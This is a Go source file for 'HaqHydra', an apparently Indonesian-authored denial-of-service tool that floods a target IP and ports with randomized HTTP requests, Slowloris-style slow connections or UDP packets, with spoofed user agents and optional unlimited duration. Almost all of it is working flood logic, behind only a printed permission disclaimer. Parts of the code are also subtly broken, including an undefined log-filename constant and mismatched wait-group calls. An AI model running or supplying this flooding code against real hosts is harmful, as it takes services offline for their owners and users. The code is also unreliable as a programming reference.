package main

import (
	"bufio"
	"crypto/rand" // Untuk angka acak kriptografis
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"os"
	"os/signal"
	"strconv" // <<<<<<< IMPOR UNTUK KONVERSI ANGKA
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// --- Konfigurasi Global & Statistik ---
var (
	sentRequestsTotal atomic.Uint64
	activeConnections atomic.Uint64
	errorCount atomic.Uint64
	serverErrors atomic.Uint64

	stopEvent chan struct{} // Sinyal untuk menghentikan goroutine
	logFile   *os.File
	logger    *log.Logger
	wg        sync.WaitGroup // Untuk menunggu semua goroutine selesai
)

// --- Banner ---
const BANNER = `
░█▀▀▀█░░█░░░█░█▀▀█░█▀▀▄░█▀▀▄░░░░█░░░█░█▀▀█░█▀▀▄░█▀▀█░
░█░░░█░░█░░░█░█░░█░█░░░░█░░░░░░░░█░░░█░█░░█░█░░░░█░░░░
░█▀▀▀█░░█░░░█░█▀▀█░█▀▀▄░█▀▀▄░░░░█░░░█░█▀▀█░█▀▀▄░█▀▀▀█░
░█░░░█░░█░░░█░█░░░░█░░░░█░░░░░░░░█░░░█░█░░░░█░░░░█░░░░
░█▀▀▀█░░█▄▄█▀░█░░░░█▀▀▀░░█▀▀▀░░░░╚█████╝░█░░░░█▀▀▀░░█░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
███████░███████░███████░███████░███████░███████░███████░
██╔════╝░██╔════╝░██╔════╝░██╔════╝░██╔════╝░██╔════╝░██╔════╝
███████╗░███████╗░███████╗░███████╗░███████╗░███████╗░███████╗
██╔════╝░╚════██║░╚════██║░╚════██║░╚════██║░╚════██║░╚════██║
███████╗░███████║░███████║░███████║░███████║░███████║░███████║
╚══════╝░╚══════╝░╚══════╝░╚══════╝░╚══════╝░╚══════╝░╚══════╝░
`

// --- User Agents ---
var USER_AGENTS = []string{
	"Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 8.0.0; SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 7.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.141 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 10; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 10; Mi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 10; HMD Global Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
}

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

// --- Helper Functions ---
// rand.Int digunakan dari crypto/rand karena lebih aman untuk acak kriptografis
func getRandomBigInt(max int64) *big.Int {
	n, err := rand.Int(rand.Reader, big.NewInt(max))
	if err != nil {
		// Fallback ke math/rand jika crypto/rand gagal (jarang terjadi)
		// Atau log error dan return nilai default
		log.Printf("Warning: crypto/rand failed, falling back to math/rand for random number: %v", err)
		return big.NewInt(int64(time.Now().Nanosecond() % int(max))) // Pendekatan sederhana
	}
	return n
}

func generateRandomString(length int) string {
	result := make([]byte, length)
	for i := range result {
		randomIndex := getRandomBigInt(int64(len(charset)))
		result[i] = charset[randomIndex.Int64()]
	}
	return string(result)
}

func getRandomUserAgent() string {
	if len(USER_AGENTS) == 0 {
		return "HaqHydraClient"
	}
	randomIndex := getRandomBigInt(int64(len(USER_AGENTS)))
	return USER_AGENTS[randomIndex.Int64()]
}

func parseHTTPStatus(responseData []byte) (string, string) {
	if len(responseData) == 0 {
		return "", "No Response Data"
	}
	responseStr := string(responseData)
	if strings.Contains(responseStr, "HTTP/") {
		scanner := bufio.NewScanner(strings.NewReader(responseStr))
		if scanner.Scan() {
			statusLine := scanner.Text()
			parts := strings.Fields(statusLine)
			if len(parts) >= 2 {
				return parts[1], statusLine
			}
		}
	}
	return "", "Non-HTTP Response"
}

// --- Attack Manager ---
type AttackManager struct {
	targetIP        string
	ports           []int
	threadsPerPort  int
	attackType      string
	mode            string
	durationSec     *int64 // Pointer to distinguish 0 from nil
	httpMethod      string
	numSocketsPerThread int
	stopCh          chan struct{} // For goroutine stop signals
	wg              sync.WaitGroup // To wait for goroutines
}

func NewAttackManager(targetIP string, ports []int, threadsPerPort int, attackType, mode string, durationSec int64, httpMethod string) *AttackManager {
	if durationSec < 0 {
		durationSec = 0 // Negative duration means unlimited
	}
	var durationPtr *int64
	if durationSec > 0 {
		durationPtr = &durationSec
	}

	numSocketsPerThread := 10
	if mode != "slow" {
		numSocketsPerThread = 50
	}

	if strings.ToLower(attackType) == "http" && strings.ToLower(mode) == "slow" && strings.ToUpper(httpMethod) == "POST" {
		logger.Printf("Warning: POST method in 'slow' mode might be less effective or behave unexpectedly.")
	}

	logger.Printf("Initializing HaqHydra for %v:%v (%s/%s) with %d threads/port. Duration: %v. HTTP Method: %s",
		targetIP, ports, attackType, mode, threadsPerPort, func() string {
			if durationPtr == nil {
				return "Unlimited"
			}
			return fmt.Sprintf("%ds", *durationPtr)
		}(), httpMethod)

	return &AttackManager{
		targetIP:        targetIP,
		ports:           ports,
		threadsPerPort:  threadsPerPort,
		attackType:      strings.ToLower(attackType),
		mode:            strings.ToLower(mode),
		durationSec:     durationPtr,
		httpMethod:      strings.ToUpper(httpMethod),
		numSocketsPerThread: numSocketsPerThread,
		stopCh:          make(chan struct{}),
	}
}

func (am *AttackManager) log(format string, v ...interface{}) {
	logger.Printf(fmt.Sprintf("[HaqHydra] [%s] %s", am.targetIP, format), v...)
}

func (am *AttackManager) atomicInc(val *atomic.Uint64) {
	val.Add(1)
}

func (am *AttackManager) atomicGet(val *atomic.Uint64) uint64 {
	return val.Load()
}

// --- Helper Methods ---
func (am *AttackManager) generateHTTPRequest(target, method, mode string) string {
	randomPath := fmt.Sprintf("/?%s", generateRandomString(10))
	headers := []string{
		fmt.Sprintf("%s %s HTTP/1.1", method, randomPath),
		fmt.Sprintf("Host: %s", target),
		fmt.Sprintf("User-Agent: %s", getRandomUserAgent()),
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Accept-Language: en-US,en;q=0.5",
		"Connection: keep-alive",
		"Upgrade-Insecure-Requests: 1",
	}

	bodyData := []byte{}
	if method == "POST" {
		postPayloadStr := fmt.Sprintf("user=%s&pass=%s&data=%s", generateRandomString(20), generateRandomString(20), generateRandomString(50))
		bodyData = []byte(postPayloadStr)
		headers = append(headers, "Content-Type: application/x-www-form-urlencoded")
		headers = append(headers, fmt.Sprintf("Content-Length: %d", len(bodyData)))
	}

	if mode == "slow" {
		headers = []string{
			fmt.Sprintf("%s %s HTTP/1.1", method, randomPath),
			fmt.Sprintf("Host: %s", target),
			fmt.Sprintf("User-Agent: %s", getRandomUserAgent()),
			"Accept: */*",
			"Accept-Encoding: identity",
			"Connection: keep-alive",
		}
		if method == "POST" {
			postPayloadStr := fmt.Sprintf("data=%s", generateRandomString(10))
			bodyData = []byte(postPayloadStr)
			headers = append(headers, "Content-Type: application/x-www-form-urlencoded")
			headers = append(headers, fmt.Sprintf("Content-Length: %d", len(bodyData)))
		}
	}

	headers = append(headers, "") // Akhiri header dengan baris kosong
	request := strings.Join(headers, "\r\n")
	if len(bodyData) > 0 {
		request += "\r\n" + string(bodyData)
	}
	return request
}

func (am *AttackManager) generateUDPPacket() []byte {
	payloadLen := 500 + int(getRandomBigInt(500).Int64()) // Panjang acak antara 500-1000
	payload := make([]byte, payloadLen)
	for i := range payload {
		randomIndex := getRandomBigInt(int64(len(charset)))
		payload[i] = charset[randomIndex.Int64()]
	}
	return payload
}

// --- Goroutine Methods ---

func (am *AttackManager) openConnection(port int, limit int) {
	var conn net.Conn
	var err error
	
	address := fmt.Sprintf("%s:%d", am.targetIP, port)

	if am.attackType == "http" {
		conn, err = net.DialTimeout("tcp", address, 5*time.Second)
	} else if am.attackType == "udp" {
		// UDP Dial returns a UDPConn
		conn, err = net.Dial("udp", address)
	} else {
		am.log("Unsupported attack type %s", am.attackType)
		return
	}

	if err != nil {
		am.atomicInc(&errorCount)
		am.log("Failed to establish connection to %s: %v", address, err)
		return
	}

	// Konfigurasi koneksi dasar
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(30 * time.Second)
	}

	am.wg.Add(1) // Tambah ke waitgroup sebelum goroutine aktif
	go func() {
		defer wg.Done() // Pastikan wg.Done() dipanggil
		defer conn.Close()

		if am.atomicGet(&activeConnections) >= uint64(limit) && am.attackType == "http" { // Hanya batasi koneksi untuk HTTP
			return
		}

		am.atomicInc(&activeConnections)
		am.log("New connection opened to %s. Active: %d", address, am.atomicGet(&activeConnections))

		if am.attackType == "http" {
			am.httpAttackGoroutine(conn, port)
		} else if am.attackType == "udp" {
			am.udpAttackGoroutine(conn, port)
		}
	}()
}

func (am *AttackManager) httpAttackGoroutine(conn net.Conn, port int) {
	requestQueue := make(chan string, am.numSocketsPerThread*2)
	for i := 0; i < am.numSocketsPerThread*2; i++ {
		requestQueue <- am.generateHTTPRequest(am.targetIP, am.httpMethod, am.mode)
	}

	startTime := time.Now()
	lastWriteTime := time.Now()
	idleLoops := 0

	for {
		select {
		case <-stopEvent: // Sinyal berhenti global
			am.log("Received stop signal. Exiting HTTP goroutine for %d.", port)
			return
		default:
			// Lanjutkan jika tidak ada sinyal berhenti
		}

		// Cek durasi serangan
		if am.durationSec != nil && time.Since(startTime).Seconds() > float64(*am.durationSec) {
			am.log("Attack duration reached for %d. Stopping HTTP goroutine.", port)
			return
		}

		// Coba buka koneksi baru jika masih di bawah batas (hanya untuk http)
		// Ini harusnya ditangani oleh pemanggil `openConnection` utama, tapi bisa juga cek di sini
		if am.atomicGet(&activeConnections) < uint64(am.numSocketsPerThread) {
			go am.openConnection(port, am.numSocketsPerThread) // Buka koneksi baru
		}

		// Cek apakah koneksi masih aktif atau perlu ditutup
		if err := conn.SetReadDeadline(time.Now().Add(2 * time.Second)); err != nil {
			am.atomicInc(&errorCount)
			am.log("Failed to set read deadline for %d: %v", port, err)
			return
		}
		
		buffer := make([]byte, 1) // Baca 1 byte untuk cek keaktifan koneksi
		n, readErr := conn.Read(buffer)

		if readErr != nil {
			if netErr, ok := readErr.(net.Error); ok && netErr.Timeout() {
				// Timeout, coba kirim data lagi (penting untuk mode slow)
				if am.mode == "slow" && time.Since(lastWriteTime).Seconds() < 5 { // Kirim ulang jika belum terlalu lama
					goto sendData // Lompat ke bagian kirim data
				}
				
				idleLoops++
				if idleLoops > 5 { // Jika timeout berulang kali, anggap koneksi mati
					am.log("Read timeout repeated for %d. Closing connection.", port)
					return
				}
				continue // Lanjutkan ke loop berikutnya
			} else {
				am.atomicInc(&errorCount)
				am.log("Read error from %d: %v", port, readErr)
				return // Tutup koneksi jika ada error lain
			}
		}

		idleLoops = 0 // Reset idle counter jika ada pembacaan berhasil

		if n > 0 {
			// Parse status jika ada respons
			status, _ := parseHTTPStatus(buffer[:n])
			if status != "" && (strings.HasPrefix(status, "4") || strings.HasPrefix(status, "5")) {
				am.atomicInc(&serverErrors)
				am.log("Server Error (%s) from %d", status, port)
			}

			if am.mode == "normal" { // Mode normal: tutup setelah baca
				am.log("Received response for %d. Closing connection (normal mode).", port)
				return
			}
			// Jika mode 'slow', biarkan koneksi terbuka
		} else { // n == 0, berarti koneksi ditutup oleh peer
			am.log("Connection closed by peer on %d.", port)
			return
		}

	sendData: // Label untuk melompat ke sini (misalnya saat timeout pada mode slow)
		// Kirim permintaan
		request, ok := <-requestQueue
		if !ok {
			am.log("Request queue empty for %d. Exiting.", port)
			return
		}

		if _, writeErr := conn.Write([]byte(request)); writeErr != nil {
			am.atomicInc(&errorCount)
			am.log("Write error to %d: %v", port, writeErr)
			return
		}
		am.atomicInc(&sentRequestsTotal)
		lastWriteTime = time.Now() // Catat waktu terakhir kirim data

		if am.mode == "slow" { // Kirim data tambahan untuk mode slow
			slowData := fmt.Sprintf("X-HaqHydra-KeepAlive: %s\r\n", generateRandomString(15))
			if _, writeSlowErr := conn.Write([]byte(slowData)); writeSlowErr != nil {
				am.atomicInc(&errorCount)
				am.log("Slow write error to %d: %v", port, writeSlowErr)
				return
			}
		}
		
		time.Sleep(time.Millisecond * 1) // Jeda kecil
	}
}

func (am *AttackManager) udpAttackGoroutine(conn net.Conn, port int) {
	startTime := time.Now()
	for {
		select {
		case <-stopEvent:
			am.log("Received stop signal. Exiting UDP goroutine for %d.", port)
			return
		default:
			// Lanjutkan jika tidak ada sinyal berhenti
		}

		// Cek durasi serangan
		if am.durationSec != nil && time.Since(startTime).Seconds() > float64(*am.durationSec) {
			am.log("Attack duration reached for %d. Stopping UDP goroutine.", port)
			return
		}

		payload := am.generateUDPPacket()
		if _, writeErr := conn.Write(payload); writeErr != nil {
			am.atomicInc(&errorCount)
			am.log("UDP Write error to %d: %v", port, writeErr)
			return
		}
		am.atomicInc(&sentRequestsTotal)

		time.Sleep(time.Millisecond * time.Duration(1+int(getRandomBigInt(4).Int64()))) // Jeda acak kecil
	}
}

func (am *AttackManager) statsDisplay() {
	for {
		select {
		case <-stopEvent:
			fmt.Print("\n") // Pindah ke baris baru
			return
		case <-time.After(1 * time.Second):
			fmt.Printf("\r[\033[1;36mSTATS\033[0m] Target: \033[1;36m%s\033[0m | Sent: \033[1;32m%d\033[0m | Active Con: \033[1;34m%d\033[0m | Srv Err: \033[1;33m%d\033[0m | Errors: \033[1;31m%d\033[0m | Log: %s",
				am.targetIP,
				am.atomicGet(&sentRequestsTotal),
				am.atomicGet(&activeConnections),
				am.atomicGet(&serverErrors),
				am.atomicGet(&errorCount),
				LOG_FILENAME,
			)
		}
	}
}

func (am *AttackManager) Start() {
	fmt.Printf("\n\033[1;32mStarting HAQ-HYDRA %s (%s) attack on %s on ports %v with %d threads/port (Method: %s). Duration: %v...\033[0m\n",
		strings.ToUpper(am.attackType), strings.ToUpper(am.mode), am.targetIP, am.ports, am.threadsPerPort, am.httpMethod, func() string {
			if am.durationSec == nil {
				return "Unlimited"
			}
			return fmt.Sprintf("%ds", *am.durationSec)
		}())

	// Mulai goroutine statistik
	go am.statsDisplay()

	// Mulai goroutine serangan
	for _, port := range am.ports {
		for i := 0; i < am.threadsPerPort; i++ {
			// Pemanggilan openConnection sekarang menangani pembuatan koneksi dan goroutine
			go am.openConnection(port, am.numSocketsPerThread)
		}
	}

	// Loop utama untuk durasi atau menunggu interupsi
	if am.durationSec != nil {
		time.Sleep(time.Duration(*am.durationSec) * time.Second)
		fmt.Printf("\n\033[1;33mAttack duration (%ds) reached. Stopping attack...\033[0m\n", *am.durationSec)
		close(stopEvent) // Kirim sinyal berhenti global
	} else {
		fmt.Println("\033[1;31mAttack running indefinitely. Press Ctrl+C to stop...\033[0m")
		<-stopEvent // Tunggu sinyal berhenti global (dari Ctrl+C)
	}

	// Tunggu semua goroutine serangan selesai setelah sinyal berhenti dikirim
	am.wg.Wait()
	fmt.Println("\nHaqHydra attack finished.")
}

// Stop members tidak secara eksplisit dipanggil di sini karena Stop()
// sudah dicakup oleh penanganan Ctrl+C dan loop durasi yang mengarah ke close(stopEvent).
// wg.Wait() di akhir Start() adalah mekanisme cleanup utama.

// --- Main Function ---
func main() {
	// Inisialisasi Awal
	fmt.Printf("\033[1;36m------------------------------------------------------------\033[0m\n")
	fmt.Printf("\033[1;36m%s\033[0m\n", "Inisialisasi...")
	fmt.Printf("\033[1;36m------------------------------------------------------------\033[0m\n")

	// Setup Logging
	var err error
	logFile, err = os.OpenFile("attack_log.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		log.Fatalf("Failed to open log file: %v", err)
	}
	// Gunakan io.MultiWriter untuk menulis ke konsol dan file log
	logger = log.New(io.MultiWriter(os.Stdout, logFile), "", log.Ldate|log.Ltime)

	fmt.Print(BANNER) // Cetak banner hanya di sini
	fmt.Printf("\n\033[1;36m------------------------------------------------------------\033[0m\n")

	// Peringatan & Instruksi
	fmt.Println("\033[1;33m!!! PERINGATAN HAQ-HYDRA !!!\033[0m")
	fmt.Println("\033[1;33mScript ini adalah alat PENGUJIAN KEAMANAN yang kuat.\033[0m")
	fmt.Println("\033[1;33mGunakan HANYA pada sistem yang Anda miliki atau memiliki izin TERTULIS.\033[0m")
	fmt.Println("\033[1;33mPenggunaan ILEGAL berakibat pada HUKUMAN PIDANA.\033[0m")
	fmt.Println("\033[1;31mTekan CTRL+C dalam 5 detik untuk membatalkan...\033[0m")

	time.Sleep(5 * time.Second)

	// Parsing Argumen Command Line
	if len(os.Args) < 7 {
		fmt.Printf("\nUsage: %s <TARGET_IP> <PORT> <THREADS_PER_PORT> <ATTACK_TYPE> <MODE> <DURATION_SEC> [HTTP_METHOD]\n", os.Args[0])
		fmt.Println("DURATION_SEC: Attack duration in seconds (e.g., 60 for 1 minute, 0 for unlimited)")
		fmt.Println("ATTACK_TYPE: 'http' or 'udp'")
		fmt.Println("MODE: 'normal' (fast flood) or 'slow' (slowloris-like)")
		fmt.Println("HTTP_METHOD (optional for 'http' type): 'GET' (default) or 'POST'")
		fmt.Println("\nExample:")
		fmt.Printf("  HTTP Normal GET (60s):  %s 192.168.1.100 80 500 http normal 60 GET\n", os.Args[0])
		fmt.Printf("  HTTP Slow POST (120s):  %s 192.168.1.100 8080 200 http slow 120 POST\n", os.Args[0])
		fmt.Printf("  UDP Flood (30s):        %s 192.168.1.100 53 1000 udp 30\n", os.Args[0])
		fmt.Printf("  Unlimited UDP:          %s 192.168.1.100 53 1000 udp 0\n", os.Args[0])
		os.Exit(1)
	}

	targetIP := os.Args[1]
	portArg := os.Args[2]
	threadsPerPort, err := strconv.Atoi(os.Args[3])
	if err != nil || threadsPerPort <= 0 {
		log.Fatalf("Invalid THREADS_PER_PORT '%s'. Must be a positive integer.", os.Args[3])
	}
	attackType := os.Args[4]
	mode := os.Args[5]
	durationSec, err := strconv.ParseInt(os.Args[6], 10, 64)
	if err != nil || durationSec < 0 {
		log.Fatalf("Invalid DURATION_SEC '%s'. Must be a non-negative integer (0 for unlimited).", os.Args[6])
	}
	httpMethod := "GET"
	if len(os.Args) > 7 && strings.ToUpper(attackType) == "HTTP" {
		httpMethod = strings.ToUpper(os.Args[7])
		if httpMethod != "GET" && httpMethod != "POST" {
			log.Fatalf("Invalid HTTP method '%s'. Use 'GET' or 'POST'.", httpMethod)
		}
	}

	// Validasi Attack Type
	if !strings.Contains("http udp", strings.ToLower(attackType)) {
		log.Fatalf("Invalid ATTACK_TYPE '%s'. Must be 'http' or 'udp'.", attackType)
	}

	// Parsing Port
	var ports []int
	if strings.Contains(portArg, "-") {
		parts := strings.Split(portArg, "-")
		startPort, err1 := strconv.Atoi(parts[0])
		endPort, err2 := strconv.Atoi(parts[1])
		if err1 != nil || err2 != nil || startPort < 1 || endPort > 65535 || startPort > endPort {
			log.Fatalf("Invalid port range '%s'. Ports must be between 1-65535 and start <= end.", portArg)
		}
		for p := startPort; p <= endPort; p++ {
			ports = append(ports, p)
		}
	} else {
		port, err := strconv.Atoi(portArg)
		if err != nil || port < 1 || port > 65535 {
			log.Fatalf("Invalid PORT '%s'. Port must be between 1-65535.", portArg)
		}
		ports = append(ports, port)
	}

	// Setup stop channel
	stopEvent = make(chan struct{})

	// Buat dan jalankan AttackManager
	manager := NewAttackManager(targetIP, ports, threadsPerPort, attackType, mode, durationSec, httpMethod)

	// Handle Ctrl+C (SIGINT)
	go func() {
		sig := make(chan os.Signal, 1)
		signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
		<-sig
		fmt.Println("\nCtrl+C detected. Initiating shutdown...")
		close(stopEvent) // Kirim sinyal berhenti global
	}()

	manager.Start()

	log.Println("HaqHydra program finished.")
}
